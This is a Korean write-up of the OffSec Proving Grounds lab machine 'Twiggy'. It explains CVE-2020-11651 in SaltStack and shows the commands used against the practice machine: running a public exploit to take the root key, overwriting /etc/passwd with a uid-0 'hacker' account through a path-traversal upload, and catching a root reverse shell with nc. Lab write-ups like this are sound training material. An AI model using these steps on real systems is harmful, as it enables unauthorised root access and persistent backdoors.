@@ -1,0 +1,167 @@
+# Twiggy
+
+
+
+```
+title: "Proving grounds Practice: Twiggy 문제풀이"
+excerpt: "Offsec proving grounds practice linux machine writeup"
+categories: pg_practice
+tags: 
+- CTF
+- Offsec labs
+- OSCP
+- Writeup
+- Linux
+- pg-practice
+typora-root-url: ../../
+date: 2025-08-25
+last_modified_at: 2025-08-26
+```
+
+### Nmap
+
+```
+$ nmap -p- -Pn -n --open 192.168.58.62
+[ . . . ]
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open domain
+80/tcp   open http
+4505/tcp open unknown
+4506/tcp open unknown
+8000/tcp open http-alt
+```
+
+### Web
+
+#### PORT: 80
+
+![img](file:///Users/user/naaamgi.github.io/images/2025-08-25-twiggy/image.png?lastModify=1759135357)
+
+#### PORT: 8000
+
+![img](file:///Users/user/naaamgi.github.io/images/2025-08-25-twiggy/image-1.png?lastModify=1759135357)
+
+The SaltStack Salt REST API 가 실행중인 것을 확인
+
+![img](file:///Users/user/naaamgi.github.io/images/2025-08-25-twiggy/image-2.png?lastModify=1759135357)
+
+### Vulnerability Analysis
+
+#### CVE-2020-11651
+
+[Saltstack 3000.1 - Remote Code Execution](https://www.exploit-db.com/exploits/48421)
+
+* CVE-2020-11651은 SaltStack Salt라는 IT 자동화 및 원격 관리 도구에서 발견된 인증 우회(authentication bypass) 취약점
+* 영향을 받는 버전: **2019.2.4 이전 및 3000 이전 버전의 SaltStack Salt**
+* SaltStack의 salt-master 프로세스 내 ClearFuncs 클래스에서 메서드 호출을 제대로 검증하지 않아 발생
+* 공격자는 인증 절차 없이 특정 메서드에 접근 가능
+* 이를 통해 공격자는 salt master에서 사용자 토큰(root 권한을 가진 키)을 탈취할 수 있으며, salt minion(관리 대상 서버)에서 임의의 명령어를 실행할 수 있게 된다.
+* CVSS v3 기준 기본 점수 10.0 (치명적, Critical)
+* 공격자가 네트워크에서 Salt Master의 **포트 4505 또는 4506**에 접속할 수 있으면 공격 가능
+
+### Exploitation
+
+[used exploit](https://github.com/jasperla/CVE-2020-11651-poc)
+
+해당 익스플로잇을 사용하기 위해서 `salt` 설치가 필요하다.
+
+```
+# 가상환경에서 salt 설치
+python3 -m venv ~/salt_env
+source ~/salt_env/bin/activate
+pip install salt
+​
+# 의존성 문제 발생 시 아래 목록 추가 설치
+pip3 install pyzmq PyYAML pycrypto msgpack jinja2 psutil tornado
+​
+```
+
+exploit 실행
+
+```
+(salt)?(kali?kali)-[~/Desktop]
+$ python3 -W ignore exploit.py --master 192.168.53.62
+[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
+/home/kali/salt/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
+warn_until(
+[+] Checking salt-master (192.168.53.62:4506) status... ONLINE
+[+] Checking if vulnerable to CVE-2020-11651... YES
+[*] root key obtained: YW+X7MyAJUrsskh2mt7TkF3FvyJaWLbGfylEiu5AdjFu9Rr8ggmt+HuXNPmPn9rfU1T7rmGnPCY=
+​
+---
+​
+python exploit.py --master 192.168.174.62 --read /etc/passwd
+```
+
+![img](file:///Users/user/naaamgi.github.io/images/2025-08-25-twiggy/image-3.png?lastModify=1759135357)
+
+`/etc/passwd` 파일을 읽고 쓰는 것이 가능하다.
+
+초기 침투에는 2가지 방법이 있는데 첫번째는 새로운 유저를 루트권한으로 생성 후 접근하는 것이고 두번째는 리버스쉘을 실행시켜 쉘을 획득하는 방법이 있다.
+
+먼저 첫번째 방법으로 익스플로잇 시도.
+
+#### Create new user
+
+```
+openssl passwd hacked
+$1$iBeMKMaU$.O3VYqCZxUvapPL.OQ97/1
+```
+
+`openssl`을 이용해 `passwd`에 들어갈 패스워드 `hacked`를 해시화 해준다.
+
+이후 `passwd`의 형식에 맞게 위 해시를 이용해 계정 정보를 만들어준다.
+
+```
+hacker:$1$iBeMKMaU$.O3VYqCZxUvapPL.OQ97/1:0:0:root:/root:/bin/bash
+```
+
+**Writing /etc/passwd file**
+
+익스플로잇의 업로드 기능을 이용해 조작한 `passwd` 파일을 타겟 호스트에 업로드한다.
+
+```
+(salt)?(kali?kali)-[~/Desktop]
+$ python3 -W ignore exploit.py --master 192.168.53.62 --upload-src passwd --upload-dest ../../../../../../../../../../../../etc/passwd
+​
+```
+
+* `passwd` 업로드 ![img](file:///Users/user/naaamgi.github.io/images/2025-08-25-twiggy/image-6.png?lastModify=1759135357)
+
+**Verify the user existence**
+
+* 수정된 `passwd` -> `hacker:hacked` 계정이 생성된 모습 ![img](file:///Users/user/naaamgi.github.io/images/2025-08-25-twiggy/image-5.png?lastModify=1759135357)
+
+**Root 권한 획득**
+
+* 이후 ssh 접근을 시도해 루트 권한을 획득했다. ![img](file:///Users/user/naaamgi.github.io/images/2025-08-25-twiggy/image-4.png?lastModify=1759135357)
+
+#### Reverse Shell
+
+주의할 점: 리버스쉘은 **4505 또는 4506 포트** 에서만 가능하다.
+
+* 리버스 쉘을 실행시켜 루트 권한 획득에 성공했다. ![리버스쉘](file:///Users/user/naaamgi.github.io/images/2025-08-25-twiggy/image-7.png?lastModify=1759135357)
+
+루트 쉘 획득
+
+```
+┌──(kali㉿kali)-[~/Desktop/offsec]
+└─$ nc -lnvp 4505
+listening on [any] 4505 ...
+connect to [192.168.45.198] from (UNKNOWN) [192.168.186.62] 36348
+​
+[root@twiggy root]# id; hostname; ip a;
+id; hostname; ip a;
+uid=0(root) gid=0(root) groups=0(root)
+twiggy
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+  link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+  inet 127.0.0.1/8 scope host lo
+      valid_lft forever preferred_lft forever
+3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+  link/ether 00:50:56:ab:1f:b0 brd ff:ff:ff:ff:ff:ff
+  inet 192.168.186.62/24 brd 192.168.186.255 scope global ens160
+      valid_lft forever preferred_lft forever
+​
+```
